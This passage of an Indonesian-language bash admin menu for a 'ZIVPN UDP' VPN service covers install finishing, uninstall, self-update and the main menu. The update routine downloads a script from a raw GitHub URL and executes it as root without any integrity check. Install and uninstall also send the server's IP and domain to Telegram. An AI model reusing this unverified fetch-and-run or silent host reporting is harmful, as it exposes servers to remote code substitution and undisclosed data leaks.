    cp "$(realpath $0)" /usr/local/bin/zivpn-menu 2>/dev/null
    chmod +x /usr/local/bin/zivpn-menu 2>/dev/null
    echo "alias zivpn='bash /usr/local/bin/zivpn-menu'" >> /root/.bashrc 2>/dev/null
    
    send_telegram "✅ ZIVPN INSTALLED\nIP: $(get_ip)\nDomain: $(get_domain)"
    
    press_enter
}

# === UNINSTALL ===

uninstall_zivpn() {
    banner
    echo -e "${BOLD}${RED}[ UNINSTALL ZIVPN ]${NC}"
    echo ""
    read -rp "Yakin uninstall? [y/N] : " confirm

    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        press_enter
        return
    fi

    systemctl stop zivpn.service
    systemctl disable zivpn.service > /dev/null 2>&1
    rm -f "$SERVICE_FILE"
    rm -f "$ZIVPN_BIN"
    rm -f /usr/local/bin/zivpn-cron.sh
    rm -f /usr/local/bin/zivpn-menu
    rm -f /usr/local/bin/zivpn-auto-backup.sh
    rm -rf "$ZIVPN_DIR"
    systemctl daemon-reload
    crontab -l 2>/dev/null | grep -v "zivpn" | crontab -

    echo -e "${GREEN}Uninstall selesai!${NC}"
    
    send_telegram "❌ ZIVPN UNINSTALL\nIP: $(get_ip)"
    
    sleep 2
    exit 0
}

# === UPDATE SCRIPT ===

update_script() {
    banner
    echo -e "${BOLD}${YELLOW}[ UPDATE SCRIPT ]${NC}"
    echo ""

    local SCRIPT_URL="https://raw.githubusercontent.com/script-VIP/Vip/main/udp/zs.sh"
    local SCRIPT_PATH=$(realpath "$0")
    local tmp=$(mktemp)

    echo "Mengecek update..."
    wget -q "$SCRIPT_URL" -O "$tmp"

    if [[ ! -s "$tmp" ]]; then
        echo -e "${RED}Gagal download update!${NC}"
        rm -f "$tmp"
        press_enter
        return
    fi

    if diff -q "$tmp" "$SCRIPT_PATH" > /dev/null 2>&1; then
        echo -e "${GREEN}Script sudah versi terbaru!${NC}"
        rm -f "$tmp"
    else
        cp "$tmp" "$SCRIPT_PATH"
        chmod +x "$SCRIPT_PATH"
        rm -f "$tmp"
        echo -e "${GREEN}Script berhasil diupdate!${NC}"
        press_enter
        exec bash "$SCRIPT_PATH"
    fi

    press_enter
}

# === MENU UTAMA ===

main_menu() {
    while true; do
        banner

        if ! is_installed; then
            echo -e "${RED}ZIVPN belum terinstall!${NC}"
            echo ""
            echo "1. Install ZIVPN UDP"
            echo ""
            read -rp "Pilih menu [1] : " choice
            case $choice in
                1) install_zivpn ;;
                *) echo "Pilihan tidak valid!"; sleep 1 ;;
            esac
        else
            echo "1. Tambah User"
            echo "2. Hapus User"
            echo "3. Daftar User"
            echo "4. Perpanjang User"
            echo "5. Set Domain"
            echo "6. Ubah Limit IP"
            echo "7. Cek User Online"
            echo "8. Hapus User Expired"
            echo "9. Status Service"
            echo "10. Restart Service"
            echo "11. Backup Manual"
            echo "12. Restore Backup"
            echo "13. Update Script"
            echo "14. Uninstall ZIVPN"
            echo ""
            read -rp "Pilih menu [1-14] : " choice

            case $choice in
                1) add_user ;;
                2) delete_user ;;
                3) list_users ;;
                4) renew_user ;;
                5) set_domain ;;
                6) change_limit ;;
                7) check_online_users ;;
                8) clean_expired ;;
                9) status_service ;;
                10) restart_service ;;
                11) backup_now ;;
                12) restore_backup ;;
                13) update_script ;;
                14) uninstall_zivpn ;;
                *) echo "Pilihan tidak valid!"; sleep 1 ;;
            esac
        fi
    done
}

# === START ===

check_root
main_menu
